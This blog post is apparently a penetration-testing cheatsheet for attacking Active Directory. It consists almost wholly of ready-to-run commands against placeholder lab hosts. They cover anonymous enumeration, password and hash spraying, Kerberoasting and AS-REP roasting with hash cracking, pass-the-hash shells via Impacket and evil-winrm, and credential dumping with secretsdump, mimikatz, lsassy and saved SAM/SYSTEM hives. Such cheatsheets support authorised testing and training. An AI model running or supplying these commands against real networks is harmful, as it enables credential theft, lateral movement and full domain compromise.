---
layout: post
title:  Attacking Active Directory Cheatsheet
description: Cheatsheet for Attacking Active Directory
date:   2024-11-01 01:00:00 +0300
image:  '/images/10000.jpg'
tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB, Kerberoasting, AS-REP-Roasting, DCSync, Silver-Ticket, ACLs, MSSQL, Credential-Dumping, Credential-Hunting]
---
### Identify the Domain Controller
```shell
# Using NetExec and CrackMapExec (Examine results for a host like DC01, for example)
nxc smb 172.16.150.0/24
crackmapexec smb 172.16.150.0/24

# Nmap ARP Discovery
nmap -n -sn 172.16.150.0/24

# Nmap Scan
nmap -Pn -sT -T4 --top-ports 1000 172.16.150.0/24

# Nmap through Proxychains
proxychains -q nmap -Pn -sT -T4 --top-ports 1000 172.16.150.0/24

# To find out which host is the Domain Controller, look for these typical Domain Controller ports in Nmap the results:
Port 53 - DNS
Port 88 - Kerberos
Port 135 - RPC
Port 389 - LDAP
Port 445 - SMB
Port 636 - LDAPS
Port 3268 - Global Catalog LDAP
Port 3269 - Global Catalog LDAPS

# Create an internal_ips.txt list with all the alive IPs that we find
cat internal_ips.txt

10.10.10.2
10.10.10.5
10.10.10.6
10.10.10.11
```
### Uncredentialed Enumeration and Attacks
```shell
# DNS Zone Transfer
dig @172.16.150.10 AXFR vorkharium.com

# LDAP Anonymous Session Dump
ldapsearch -x -H ldap://172.16.150.10 -b "dc=vorkharium,dc=com"

# No-PreAuth Kerberos without Username
impacket-GetNPUsers vorkharium.com/ -dc-ip 172.16.150.10

# SMB Null Session with smbclient
smbclient -L 172.16.150.10 -N
smbclient -N -L //172.16.150.10
smbclient --no-pass -L //172.16.150.10
smbclient //172.16.150.10/Public -N
smbclient -U '%' -N \\\\172.16.150.10\\Public

# SMB Null Session with other tools
smbmap -H 172.16.150.10 -P 445
nxc smb 172.16.150.10 --shares -u 'guest' -p ''
crackmapexec smb 172.16.150.10 -u '' -p '' --shares
impacket-smbclient vorkharium.com/'':''@172.16.150.10

# RPC Null Session
rpcclient 172.16.150.10 -N
rpcclient -U "" -N 172.16.150.10
rpcclient -U="" 172.16.150.10

# RPC Commands
querydispinfo
enumdomusers
enumdomgroups
queryuser johnwick

# Command to get users and put them in users_rpc.txt
rpcclient -U "" 172.16.150.10 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users_rpc.txt

# impacket-rpcdump
impacket-rpcdump -port 135 vorkharium.com/'':''@172.16.150.10

# enum4linux
enum4linux -U 172.16.150.10

```
### Domain Password Policy Enumeration
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u 'Vivi' -p 'Thundaga2000' --pass-pol
crackmapexec smb 172.16.150.10 -u 'Tidus' -p 'ToZanarkand2001' --pass-pol

# enum4linux
enum4linux -U 172.16.150.10 # Without credentials
enum4linux -u john -p 'Password123!' -U 172.16.150.10

# CMD and PowerShell
net accounts
net user john /domain

# PowerShell (Some require AD Module to be installed)
Get-ADDefaultDomainPasswordPolicy
(Get-ADDomain).DefaultPasswordPolicy
Get-WmiObject -Class Win32_NetworkLoginProfile | Select-Object -Property Name, PasswordExpirationDate
```
### Domain and Local User Enumeration
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --users
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --users

# With impacket-GetADUsers
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/john:'Password123!'

# My custom way of creating a domain_users.txt list with one command
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/john:'Password123!' | awk 'NR>3 {print $1}' >> domain_users.txt

# LDAP
ldapsearch -x -H ldap://172.16.150.10 -D "john@vorkharium.com" -w 'Password123!' -b "dc=vorkharium,dc=com" "(objectClass=user)" sAMAccountName

# RPC
rpcclient -U 'john%Password123!' 172.16.150.10 -c "enumdomusers"

# enum4linux
enum4linux -u john -p 'Password123!' 172.16.150.10

# PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetUser

# PowerShell (AD Module)
Get-ADUser -Filter * -Property SamAccountName
Get-ADUser -Filter * -Server 172.16.150.10 -Property SamAccountName

```
### Domain and Local Group Enumeration
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --groups
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --groups

# -------------------- CMD and PowerShell --------------------

# Domain groups
net group /domain
net group "Domain Admins" /domain # Specifying a domain group

# Local groups
net localgroup
net localgroup Administrators

# Current User groups
whoami /groups

# PowerShell (Some require AD Module to be installed)
Get-ADGroup -Filter *
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Administrators"
Get-WmiObject -Class Win32_Group | Select-Object Name, Domain
Get-WmiObject -Class Win32_Group -ComputerName 172.16.150.10

# PowerShell Local Groups
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
```
### SMB Shares Credentialed Access and Enumeration
```shell
# -------------------- Enumeration --------------------

# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --shares
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --shares

# CMD and PowerShell
net view \\172.16.150.10
net share
net use
Get-SmbShare

# enum4linux
enum4linux -S 172.16.150.10

# -------------------- Connection --------------------
smbclient //172.16.150.10/Public -U john
impacket-smbclient vorkharium.com/john:'Password123!'@172.16.150.10

```
### RPC Credentialed Access and Enumeration
```shell
# With Password
rpcclient -U "username%password" 172.16.150.10

# Using hash
rpcclient //172.16.150.10 -U vorkharium.com/john%1a06b4248879e68a498d3bac51bf91c9 --pw-nt-hash

# -------------------- All RPC Queries --------------------
srvinfo
enumdomusers # Users
enumpriv # Works like "whoami /priv"
queryuser john # Detailed user info
getuserdompwinfo <RID> # Password Policy, use the previous command "queryuser" to get the RID to run this command
lookupnames john # SID of specified user
createdomuser john # Create a new user
deletedomuser john # Delete user
enumdomains
enumdomgroups
querygroup <group-RID> # Use the previous command "enumdomgroups" to get the RID to run this command
querydispinfo # Show description of all users
netshareenum # Enumerate Shares (This will only work if the current user we used to log in has permissions)
netshareenumall
lsaenumsid # SID from all users
```
### GPP cpassword
Check if we can find a file called Groups.xml inside SYSVOL folder through SMB Shares access. This file contains a "cpassword" field. To decrypt the hash in the cpassword field we can use the following command:
```shell
sudo apt install gpp-decrypt
gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
# This will give us the credentials for the user the Groups.xml is related to
```
### Password Spraying
```shell
# -------------------- kerbrute.py --------------------
git clone https://github.com/TarlogicSecurity/kerbrute.git
cd kerbrute

python3 kerbrute.py -users usernames.txt -passwords passwords.txt -dc-ip 172.16.150.10 -domain vorkharium.com

# -------------------- NetExec --------------------

# Password Spraying
nxc smb 172.16.150.10 -u john -p passwords.txt
nxc smb 172.16.150.10 -u usernames.txt -p 'Password123!'
nxc smb internal_ips.txt -u usernames.txt -p passwords.txt --continue-on-success

# Hash Spraying
nxc smb 172.16.150.10 -u john -H NT_hashes.txt
nxc smb 172.16.150.10 -u usernames.txt -H 'NT_HASH'
nxc smb internal_ips.txt -u usernames.txt -H NT_hashes.txt --continue-on-success

# Local Authentication
nxc smb 172.16.150.10 -u john -p 'Password123!' --local-auth
nxc smb 172.16.150.10 -u domain_users.txt -p passwords_found.txt --local-auth

# RDP
nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# WinRM
nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# MSSQL
nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# We can also use CrackMapExec running almost the same commands replacing "nxc" for "crackmapexec". For example:
crackmapexec smb 172.16.150.10 -u Dovahkiin -p 'FusRoDah!'
```
### Local Credential Hunting
```shell
# PowerShell History
powershell -c "Get-History"
powershell -c "(Get-PSReadlineOption).HistorySavePath"
type C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

# Display stored credentials
cmdkey /list

# -------------------- Finding and Cracking KeePass .kdbx Files --------------------

# CMD
dir /s /b *.kdbx 
# PowerShell
Get-ChildItem -Recurse -Filter *.kdbx
# Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash

# -------------------- Finding Files potentially containing Credentials --------------------

# .db and KeePass .kdbx
Get-ChildItem -Path C:\ -Include *.db, *.kdbx -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# .txt, .ini, .config, .php
Get-ChildItem -Path C:\ -Include *.txt, *.ini, *.config, *.php -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# More commands to search for credentials
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
findstr /si password *.config 
findstr /si pass/pwd *.ini
findstr /si password *.xml *.ini *.txt
findstr /spin "password" *.*

dir .s *pass* == *.config
dir /s *pass* == *cred* == *vnc* == *.config*  
```
### Runas and RunasCs.exe
```shell
# -------------------- Native Runas --------------------

# Local - Changing to user "jane"
runas /user:jane cmd # # Enter the password now when asked

# Domain - Changing to user "john"
runas /netonly /user:vorkharium.com\john cmd

# -------------------- RunasCs.exe --------------------

# Using RunasCs.exe with pwnednewuser (pwnednewuser is a new user with admin rights we added before through an exploit)
./RunasCs.exe pwnednewuser 'password123!' "cmd /c type C:\Users\Administrator\Desktop\root.txt" --bypass-uac --logon-type '8' --force-profile
```
### BloodHound, SharpHound.exe, bloodhound-python
```shell
# -------------------- BloodHound Collectors --------------------

# SharpHound v1.1.1 (Use version 1.1.1, otherwise SharpHound.exe results won't work and BloodHound will appear empty after loading them)
./SharpHound.exe --CollectionMethods All
.\SharpHound.exe -c All
.\SharpHound.exe --DisableCertVerification --DisableSigning --Domain vorkharium.com --ldapusername john --ldappassword 'Password123!'

# bloodhound-python
# Collect information with valid user "john"
bloodhound-python -d vorkharium.com -u john -p 'Password123!' -ns 172.16.150.10 -c all --dns-tcp

# -------------------- BloodHound --------------------

# Starting BloodHound
sudo neo4j console
sudo bloodhound

# Clear database
# Load the .json files we collected with SharpHound.exe or bloodhound-python

# Important queries in BloodHound
- Find all Domain Admins
- Find Principals with DCSync Rights
- List all Kerberoastable Accounts
- Find AS-REP Roastable Users (DontReqPreAuth)
- Shortest Path to High Value Targets
```
### PowerView.ps1
```shell
# Enable Running Scripts on PowerShell (as Administrator)
Set-ExecutionPolicy RemoteSigned
Set-ExecutionPolicy Unrestricted
Get-ExecutionPolicy

# Get Domain User Information
Import-Module .\PowerView.ps1
$Cred = Get-Credential -UserName "vorkharium.com\john"
# Enter password
Get-DomainUser -Identity "john" -Credential $Cred -Verbose

# Detect Kerberoastable Account
$Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
Get-DomainUser -SPN -Domain vorkharium.com -Credential $Cred | select SamAccountName
```
For a complete and detailed list of all PowerView.ps1 commands check the following link:
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
### Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash
```shell
# -------------------- Using Password --------------------

# impacket-psexec with password
impacket-psexec Administrator:'Password123!'@172.16.150.10
impacket-psexec vorkharium.com/Administrator:'Password123!'@172.16.150.10

# impacket-wmiexec with password
impacket-wmiexec Administrator:'Password123!'@172.16.150.10
impacket-wmiexec vorkharium.com/Administrator:'Password123!'@172.16.150.10

# impacket-smbexec with password
impacket-smbexec Administrator:'Password123!'@172.16.150.10
impacket-smbexec vorkharium.com/Administrator:'Password123!'@172.16.150.10

# -------------------- Using Hash (Pass-the-Hash) --------------------

# impacket-psexec with hash
impacket-psexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
impacket-psexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 

# impacket-wmiexec with hash
impacket-wmiexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
impacket-wmiexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9

# impacket-smbexec with hash
impacket-smbexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
impacket-smbexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
```
### Evil-WinRM - Access WinRM with Password or Pass-the-Hash
```shell
# With Password
evil-winrm -i 172.16.150.10 -u Administrator -p 'Password123!'

# With Hash
evil-winrm -i 172.16.150.10 -u Administrator -H 1a06b4248879e68a498d3bac51bf91c9
```
### xfreerdp - Access RDP with Password or Pass-the-Hash
```shell
# Create "/home/kali/share" before using it - This folder will allow us to move files easily from inside the xfreerdp session

# Connection with share for file transfers
xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share

# With extra parameters
xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Administrator /p:'Password123!' /d:vorkharium.com /drive:share,/home/kali/share

# Using hash
xfreerdp /u:Administrator /pth:'1a06b4248879e68a498d3bac51bf91c9' /v:172.16.150.10 /drive:share,/home/kali/share
```
### Kerberoasting with Impacket
```shell
# Using john to obtain the hash of jane
impacket-GetUserSPNs -dc-ip 172.16.150.10 vorkharium.com/john -request-user jane

# Cracking the hash
hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
```
### Kerberoasting with Rubeus.exe
```shell
# Using john to obtain the hash of jane
./Rubeus.exe kerberoast /domain:vorkharium.com /user:jane /creduser:vorkharium.com\john /credpassword:'Password123!' /nowrap

# Cracking the hash
hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
```
### AS-REP Roasting with Impacket
```shell
# AS-REP Roasting without password
impacket-GetNPUsers vorkharium.com/john -dc-ip 172.16.150.10 -request -no-pass

# AS-REP Roasting with password
impacket-GetNPUsers vorkharium.com/john:'Password123!' -dc-ip 172.16.150.10 -request -no-pass

# -------------------- Cracking the hash --------------------

# With Hashcat
hashcat -m 18200 -a 0 jane_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlists/rockyou.txt

# With John
sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
sudo john jane_hash.txt --show
```
### Remote Credential Dumping with Impacket and NetExec
```shell
# -------------------- Using Impacket --------------------

# With password
impacket-secretsdump vorkharium.com/john:'Password123!'@172.16.150.10
# Using hash
impacket-secretsdump Administrator:@172.16.150.10 --hashes :1a06b4248879e68a498d3bac51bf91c9

# Example with -just-dc-user
impacket-secretsdump -just-dc-user jane vorkharium.com/john:"Password123!"@172.16.150.10

# Example with -dc-ip
impacket-secretsdump -dc-ip 172.16.150.10 'vorkharium.com/john:"Password123!"@172.16.150.10'

# -------------------- With NetExec --------------------

# SAM
nxc smb 172.16.150.20 -u john -p 'Password123!' --sam

# LSA
nxc smb 172.16.150.20 -u john -p 'Password123!' --lsa

# NTDS.DIT RPC
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds

# NTDS.DIT VSS
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds vss

# LSASS
nxc smb 172.16.150.20 -u john -p 'Password123!' -M lsassy
nxc smb 172.16.150.20 -u john -p 'Password123!' -M mimikatz
nxc smb 172.16.150.20 -u john -p 'Password123!' -M nanodump
nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump

# LAPS Password
nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
```
### Local Credential Dumping with Mimikatz and Impacket
```shell
# -------------------- Mimikatz.exe --------------------

# Important Note: mimikatz.exe wont work from the evil-winrm console. Use nc to get shell instead
# Run mimikatz.exe as administrator

# On the mimikatz.exe console
privilege::debug
sekurlsa::logonpasswords # Hashes and plaintext passwords

# More mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords # Hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch # Both of these dump SAM

# One-liners
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

# -------------------- SAM and NTDS.DIT Dump --------------------

# reg.exe
reg save hklm\sam 'C:\Windows\Temp\sam'
reg save hklm\system 'C:\Windows\Temp\system'
reg save hklm\security 'C:\Windows\Temp\security'

# Transfer the SAM, SYSTEM and SECURITY files from Windows to Kali and to dump them locally

# Example of copying NTDS.DIT with Copy-FileSeBackupPrivilege
Copy-FileSeBackupPrivilege V:\Windows\NTDS\NTDS.DIT C:\Users\john\Desktop\NTDS.DIT
# Find a way to get NTDS.DIT and transfer it to Kali for local dump

# -------------------- impacket-secretsdump --------------------

# With Security
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local

# With NTDS.DIT
impacket-secretsdump -system SYSTEM -sam SAM -ntds NTDS.DIT local

# Without SECURITY and without NTDS.DIT (Still able to dump something interesting)
impacket-secretsdump -sam SAM -system SYSTEM local

# -------------------- samdump2 --------------------
samdump2 SYSTEM SAM

# Note: Pay attention to case sensitive, upper and lower case. Try both tools always, one might fail
```
### Silver Ticket
```shell
Comming soon.
```
### ACLs
```shell
Comming soon.
```
### MSSQL to gain Shell
```shell
Comming soon.
```